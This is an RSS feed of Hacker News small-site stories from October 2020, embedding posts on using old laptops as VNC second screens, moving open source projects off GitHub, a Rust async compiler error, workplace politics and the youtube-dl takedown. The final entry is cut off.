<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 5]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 5. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 26 Oct 2020 04:33:56 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-5.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 26 Oct 2020 04:33:55 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Old Laptops as Secondary Monitors]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 17 (<a href="https://news.ycombinator.com/item?id=24875533">thread link</a>) | @HaoZeke
<br/>
October 23, 2020 | https://rgoswami.me/posts/laptop-as-second-screens/ | <a href="https://web.archive.org/web/*/https://rgoswami.me/posts/laptop-as-second-screens/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Dual screen workflows without screens across operating systems</p></blockquote><h2 id="background">Background</h2><p>My X380 sadly has been having port issues. This meant that my M14 was no longer a viable option for my second screen needs.</p><h2 id="outline">Outline</h2><p>The general form of the solution works in one of two ways:</p><dl><dt>VNC Viewer</dt><dd>Where the (second-screen) laptop connects to a VNC server on the primary laptop</dd><dt>Peripheral Shares</dt><dd>Where the secondary laptop runs a server to enable proxying mouse and keyboard access from the primary laptop</dd></dl><h2 id="vnc-and-windows">VNC and Windows</h2><p>For laptops running Windows, I personally just set up <a href="https://tightvnc.com/">TightVNC</a>. The standard settings work well enough for the peripheral share described below.</p><p>This is best used for working with Windows only stuff like Office.</p><h2 id="vnc-and-linux">VNC and Linux</h2><p>For the secondary laptop we need to run a server (<code>tigervnc</code>) without setting an external screen.</p><div><pre><code data-lang="bash">x0vncserver -rfbauth ~/.vnc/passwd
</code></pre></div><p>Now on the main laptop, we will simply leverage <code>x2vnc</code> to extend into the secondary laptop.</p><p>Where we can get the IP (local) by checking with <code>ifconfig</code> on the secondary laptop.</p><h4 id="meta">Meta</h4><p>This works best when combined with a networked file-system, since then you can interact with files in tandem. Otherwise, there is quite a bit of <code>git</code> based back and forth.</p><h2 id="vnc-and-android">VNC and Android</h2><p>There are two parts to this solution. Note that, as Android devices don’t run X11 systems in a meaningful way, the direct access method is through a paid application, a2vnc server lite, which also did not work well in my tests. We will therefore focus on setting a VNC viewer up to connect to the primary laptop.</p><h3 id="primary-settings">Primary Settings</h3><h4 id="xrandr-setup">XRandR Setup</h4><p>For the primary laptop, we will start by obtaining our present screens configuration.</p><div><pre><code data-lang="bash">xrandr <span>|</span> grep <span>" connected"</span>
</code></pre></div><div><pre><code data-lang="bash">eDP1 connected primary 1920x1080+1920+0 <span>(</span>normal left inverted right x axis y axis<span>)</span> 290mm x 170mm
</code></pre></div><p>Naturally your output will differ. We also need the resolution of the Android device. In my case, they are the same. At this point we are ready to figure out the mode-line.</p><div><pre><code data-lang="bash"><span># 1920x1080 @ 60.00 Hz (GTF) hsync: 67.08 kHz; pclk: 172.80 MHz</span>
Modeline <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Let us now use this information to create a bunch of modelines.</p><div><pre><code data-lang="bash">xrandr --newmode <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Note that we can create more of these in the same manner. We can now move forward with making a virtual screen.</p><div><pre><code data-lang="bash">xrandr --addmode VIRTUAL1 1920x1080_60.00
</code></pre></div><p>We can now finally set up the output.</p><div><pre><code data-lang="bash">xrandr --output VIRTUAL1 --mode 1920x1080_60.00 --left-of eDP1
</code></pre></div><p>Note that it is better to use <code>mons</code> to work with our newly created virtual screen.</p><p>This is still a bit ugly, since the process needs to be repeated with each reboot.</p><h4 id="vnc-setup">VNC Setup</h4><p>Now we need prepare our VNC. <code>x11vnc</code> is recommended at the moment.</p><div><pre><code data-lang="bash">x11vnc -vencrypt nodh:only-ssl -ssl SAVE -clip 1920x1080+0+0
</code></pre></div><h3 id="android-settings">Android Settings</h3><p>For this section, I personally use <a href="https://play.google.com/store/apps/details?id=com.iiordanov.bVNC&amp;hl=en&amp;gl=US">bVNC Pro</a>. The setup is pretty dead simple. A basic VNC connection is all that is required.</p><p>In practice, I use the x86 setup, with the secondary laptop acting as a viewer for a virtual screen, mostly because that way I can tune into multiple Zoom meetings (a bonus).</p><h2 id="conclusion">Conclusion</h2><p>The final setup is quite robust to changes. Future posts might go into setting up the kind of local networking tools to help move files, code and more between both machines, to improve on the peripheral share approach. Additionally, there are still some manual steps which can and should be automated. I’m not super pleased with the setup, it takes longer than a wireless sceen</p></div></div>]]>
            </description>
            <link>https://rgoswami.me/posts/laptop-as-second-screens/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24875533</guid>
            <pubDate>Fri, 23 Oct 2020 23:33:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Important Open Source projects should not use GitHub]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24874987">thread link</a>) | @mrzool
<br/>
October 23, 2020 | https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html | <a href="https://web.archive.org/web/*/https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>
<ul>
<li><a href="https://codeberg.org/">Codeberg</a><br>Codeberg is a registered German non-profit organization and I think it is the best alternative. Codeberg does not depend on external services. No third party cookies, no tracking. Hosted in the EU.<br>Relevant discussion on <a href="https://news.ycombinator.com/item?id=22795930">Hacker News</a>. Relevant <a href="https://codeberg.org/codeberg/org/src/branch/master/PrivacyPolicy.md">Privacy Policy</a></li>
<li><a href="https://notabug.org/">NotABug</a><br>NotABug.org is run by <a href="https://peers.community/">Peers</a>, a group of people interested in free software and free society. It is mostly for small projects though. Relevant <a href="https://notabug.org/tos">Privacy Policy</a>.</li>
<li><a href="https://sourcehut.org/">sourcehut</a><br>sourcehut is currently considered alpha and it is not going to stay free, but it does not have any tracking or advertising. All features work without JavaScript. Relevant <a href="https://man.sr.ht/privacy.md">Privacy Policy</a>. Relevant discussion on <a href="https://news.ycombinator.com/item?id=23030489">Hacker News</a>. After signing up you get the following message: <q>Payment is optional during the alpha, but be aware that it will become mandatory later. This service is funded by its users, not by investors.</q></li>
</ul>
<p>A few good solutions for self-hosting (not an exhaustive list):</p>
<ul>
<li><a href="https://gogs.io/">Gogs</a> - old discussion at <a href="https://news.ycombinator.com/item?id=11374003">Hacker News</a></li>
<li><a href="https://gitea.io/en-US/">Gitea</a> a community-managed fork of Gogs - discussed at <a href="https://news.ycombinator.com/item?id=17006503">Hacker News</a></li>
<li><a href="https://github.com/theonedev/onedev">OneDev</a> - discussed at <a href="https://news.ycombinator.com/item?id=22081419">Hacker News</a></li>
</ul>
</article></div>]]>
            </description>
            <link>https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24874987</guid>
            <pubDate>Fri, 23 Oct 2020 22:28:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debugging async generator errors in Rust]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24874283">thread link</a>) | @jamii
<br/>
October 23, 2020 | https://meltware.com/2020/10/21/rust-async-nonsense.html? | <a href="https://web.archive.org/web/*/https://meltware.com/2020/10/21/rust-async-nonsense.html?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>My colleague <a href="http://mattjibson.com/">Matt Jibson</a> and I recently found ourselves
in the unfortunate situation of debugging this hefty async/await-related error
from the Rust compiler:</p>

<div><div><pre><code>error[E0277]: `(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)` cannot be shared between threads safely
   --&gt; src/materialized/src/mux.rs:138:100
    |
138 |       async fn handle_connection(&amp;self, conn: SniffedStream&lt;TcpStream&gt;) -&gt; Result&lt;(), anyhow::Error&gt; {
    |  ____________________________________________________________________________________________________^
139 | |         self.handle_connection(conn).await
140 | |     }
    | |_____^ `(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)` cannot be shared between threads safely
    |
    = help: the trait `std::marker::Sync` is not implemented for `(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)`
    = note: required because of the requirements on the impl of `std::marker::Sync` for `std::ptr::Unique&lt;(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)&gt;`
    = note: required because it appears within the type `std::boxed::Box&lt;(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)&gt;`
    = note: required because it appears within the type `std::option::Option&lt;std::boxed::Box&lt;(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)&gt;&gt;`
    = note: required because it appears within the type `coord::session::Portal`
    = note: required because of the requirements on the impl of `std::marker::Send` for `&amp;coord::session::Portal`
    = note: required because it appears within the type `for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, std::string::String, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut coord::SessionClient, coord::SessionClient, &amp;'t0 coord::session::Session, &amp;'t1 mut coord::session::Session, &amp;'t2 str, &amp;'t3 std::string::String, std::option::Option&lt;&amp;'t4 coord::session::Portal&gt;, tokio_postgres::error::sqlstate::SqlState, impl futures::Future, (), &amp;'t7 coord::session::Portal, impl futures::Future}`
    = note: required because it appears within the type `[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::describe_portal::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, 1:std::string::String for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, std::string::String, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut coord::SessionClient, coord::SessionClient, &amp;'t0 coord::session::Session, &amp;'t1 mut coord::session::Session, &amp;'t2 str, &amp;'t3 std::string::String, std::option::Option&lt;&amp;'t4 coord::session::Portal&gt;, tokio_postgres::error::sqlstate::SqlState, impl futures::Future, (), &amp;'t7 coord::session::Portal, impl futures::Future}]`
    = note: required because it appears within the type `std::future::from_generator::GenFuture&lt;[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::describe_portal::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, 1:std::string::String for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, std::string::String, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut coord::SessionClient, coord::SessionClient, &amp;'t0 coord::session::Session, &amp;'t1 mut coord::session::Session, &amp;'t2 str, &amp;'t3 std::string::String, std::option::Option&lt;&amp;'t4 coord::session::Portal&gt;, tokio_postgres::error::sqlstate::SqlState, impl futures::Future, (), &amp;'t7 coord::session::Portal, impl futures::Future}]&gt;`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8, 't9, 't10, 't11&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), std::option::Option&lt;pgwire::message::FrontendMessage&gt;, std::time::Instant, &amp;'t1 str, std::string::String, impl futures::Future, std::vec::Vec&lt;u32&gt;, impl futures::Future, std::vec::Vec&lt;pgrepr::format::Format&gt;, std::vec::Vec&lt;std::option::Option&lt;std::vec::Vec&lt;u8&gt;&gt;&gt;, impl futures::Future, i32, usize, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future}`
    = note: required because it appears within the type `[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::advance_ready::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt; for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8, 't9, 't10, 't11&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), std::option::Option&lt;pgwire::message::FrontendMessage&gt;, std::time::Instant, &amp;'t1 str, std::string::String, impl futures::Future, std::vec::Vec&lt;u32&gt;, impl futures::Future, std::vec::Vec&lt;pgrepr::format::Format&gt;, std::vec::Vec&lt;std::option::Option&lt;std::vec::Vec&lt;u8&gt;&gt;&gt;, impl futures::Future, i32, usize, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future}]`
    = note: required because it appears within the type `std::future::from_generator::GenFuture&lt;[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::advance_ready::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt; for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8, 't9, 't10, 't11&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), std::option::Option&lt;pgwire::message::FrontendMessage&gt;, std::time::Instant, &amp;'t1 str, std::string::String, impl futures::Future, std::vec::Vec&lt;u32&gt;, impl futures::Future, std::vec::Vec&lt;pgrepr::format::Format&gt;, std::vec::Vec&lt;std::option::Option&lt;std::vec::Vec&lt;u8&gt;&gt;&gt;, impl futures::Future, i32, usize, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future}]&gt;`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `for&lt;'r, 's, 't0, 't1&gt; {std::future::ResumeTy, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, i32, std::vec::Vec&lt;(std::string::String, std::string::String)&gt;, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), pgwire::protocol::State, impl futures::Future, impl futures::Future, coord::SessionClient, impl futures::Future}`
    = note: required because it appears within the type `[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::run::#0 0:pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, 1:i32, 2:std::vec::Vec&lt;(std::string::String, std::string::String)&gt; for&lt;'r, 's, 't0, 't1&gt; {std::future::ResumeTy, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, i32, std::vec::Vec&lt;(std::string::String, std::string::String)&gt;, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), pgwire::protocol::State, impl futures::Future, impl futures::Future, coord::SessionClient, impl futures::Future}]`
    = note: required because it appears within the type `std::future::from_generator::GenFuture&lt;[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::run::#0 0:pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::T…</code></pre></div></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://meltware.com/2020/10/21/rust-async-nonsense.html?">https://meltware.com/2020/10/21/rust-async-nonsense.html?</a></em></p>]]>
            </description>
            <link>https://meltware.com/2020/10/21/rust-async-nonsense.html?</link>
            <guid isPermaLink="false">hacker-news-small-sites-24874283</guid>
            <pubDate>Fri, 23 Oct 2020 21:16:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No More Politics in the Workplace]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24874206">thread link</a>) | @jakelazaroff
<br/>
October 23, 2020 | https://jake.nyc/words/no-more-politics-in-the-workplace/ | <a href="https://web.archive.org/web/*/https://jake.nyc/words/no-more-politics-in-the-workplace/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article>
  <header>
    <time datetime="Fri Oct 23 2020 01:00:00 GMT-0400 (Eastern Daylight Time)">October 23, 2020</time>
    
  </header>
  <p>Last night, Expensify CEO David Barrett sent an email <a href="https://twitter.com/rklau/status/1319397164821348357?s=21">urging all their customers to vote for Joe Biden</a>. The response was predictably polarizing, with a lot of people arguing that <a href="https://twitter.com/danrothschild/status/1319646560607752194?s=21">workplaces shouldn’t be politicized</a>.</p>
<p>Okay, fine. But if we’re doing this, can we carry it through to the end? Because I can think of a lot of corporate political activism that the people complaining are suspiciously quiet about.</p>
<!--more-->
<p>They don’t seem to mind when companies <a href="https://twitter.com/pinboard/status/1318627385655242752?s=21">donate thousands of dollars to political campaigns</a>.</p>
<p>Or when they sign <a href="https://www.nytimes.com/2019/10/25/technology/dod-jedi-contract.html">multi-billion dollar contracts with the military</a>.</p>
<p>Or when they <a href="https://www.theatlantic.com/technology/archive/2018/06/how-amazon-helped-kill-a-seattle-tax-on-business/562736/">kill taxes that would fund affordable housing</a>.</p>
<p>Or when they <a href="https://www.vanityfair.com/news/2019/12/google-investigation-national-labor-relations-board-union-firings">fire employees involved in labor organizing</a>.</p>
<p>Or when they <a href="https://www.politifact.com/factchecks/2019/nov/21/donald-trump/did-trump-open-apple-plant-austin-no/">allow politicians to use their premises for propaganda</a>.</p>
<p>No, those are all the <strong>acceptable</strong> kind of corporate politics. The kind that happens in backrooms and hides away on balance sheets. The kind in which lobbyists scratch the backs of politicians in return for favors that aren’t <strong>technically</strong> quid pro quo.</p>
<p>The message seems to be that it’s fine when companies try to bend the system to their whims, but <strong>how dare they</strong> try to impose their politics on me, personally. They can put their thumbs on the scale to fatten their wallets, but they cross a line when they suggest that I might be a bad person.</p>
<p>It’s the same bullshit attitude behind Coinbase's decision to ban political discussion at work, even though <a href="https://www.investopedia.com/articles/forex/042015/why-governments-are-afraid-bitcoin.asp">a cryptocurrency exchange is an inherently political&nbsp;business</a>.</p>
<p>Listen. I get it. You want to be able to work without worrying whether you fall on the wrong side of your employer’s politics. That’s a fair stance to take.</p>
<p>And if you want to fully embrace that stance, more power to you. There are <strong>so many</strong> instances of private industry cozying up to the government for an unfair advantage. Let's end lobbying, corporate welfare and police/military contracts. Let's get rid of revolving doors and regulatory capture. Let's stop letting companies draft legislation. No more politics in the workplace.</p>
<p>But if your principled opposition begins and ends with someone telling you that a political candidate who <a href="https://www.washingtonpost.com/opinions/2020/08/13/trump-confesses-voter-supression/">has explicitly advocated for voter suppression</a> is anti-democratic, then maybe just sit this one out.</p>

</article>
</div></div>]]>
            </description>
            <link>https://jake.nyc/words/no-more-politics-in-the-workplace/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24874206</guid>
            <pubDate>Fri, 23 Oct 2020 21:09:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The YouTube-DL Takedown]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24873805">thread link</a>) | @resynth1943
<br/>
October 23, 2020 | https://resynth1943.net/articles/youtube-dl-takedown/ | <a href="https://web.archive.org/web/*/https://resynth1943.net/articles/youtube-dl-takedown/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="content">
		
		<p>GitHub has removed the ability to access youtube-dl's source code due to a DMCA.</p>

		<p>On the 23rd of October, GitHub received a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA</a> against the youtube-dl authors, claiming the software infringed copyright Laws. While I fundamentally disagree with this, let's talk more about it.</p>
<p>First off, it should go without saying that this source code needs to be held elsewhere, outside of the control of GitHub or GitLab. We've seen an increasing amount of <a href="https://github.com/github/dmca/tree/master/2020/10">Cease and Desist</a> notices being sent to GitHub, with a staggering 124 (!) in October of 2020.</p>
<p>Secondly, copyright claims such as these are harmful to genuine software development. While these claims do hold some truth, some say it is fundamentally <em>unjust</em> to prevent access to an educational source code repository.</p>
<p>In light of distributed source code hosting platforms such as Git, thousands of developers have the public domain youtube-dl source code stored <em>locally</em>, hence the claim to remove the source code is impossible.</p>
<p>Nevertheless, there are still ways to access this source code. For starters, the <code>youtube-dl</code> module is still available on <a href="https://pypi.org/project/youtube_dl/">PyPi</a>, a package hosting platform for Python. Also, <a href="https://gitee.com/mirrors/youtube-downloader">Gitee (a Chinese Git platform)</a> contains a copy of youtube-dl in its entirety.</p>
<p>I would encourage you all to create mirrors on alternative Git hosting platforms. I'm more than happy to update this article with any further information.</p>


		<!-- Doing a little experiment here. -->
		<p aria-disabled="true">resynth1943.article</p>
	</div></div>]]>
            </description>
            <link>https://resynth1943.net/articles/youtube-dl-takedown/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873805</guid>
            <pubDate>Fri, 23 Oct 2020 20:35:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Palo Alto Tiny BASIC in the Browser]]>
            </title>
            <description>
<![CDATA[
Score 76 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24873472">thread link</a>) | @tosh
<br/>
October 23, 2020 | http://troypress.com/palo-alto-tiny-basic-in-your-browser/ | <a href="https://web.archive.org/web/*/http://troypress.com/palo-alto-tiny-basic-in-your-browser/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://troypress.com/palo-alto-tiny-basic-in-your-browser/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873472</guid>
            <pubDate>Fri, 23 Oct 2020 20:09:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Win Interviews and Influence Offers]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24873206">thread link</a>) | @vimota
<br/>
October 23, 2020 | https://vimota.me/writing/interviews | <a href="https://web.archive.org/web/*/https://vimota.me/writing/interviews">archive.org</a>
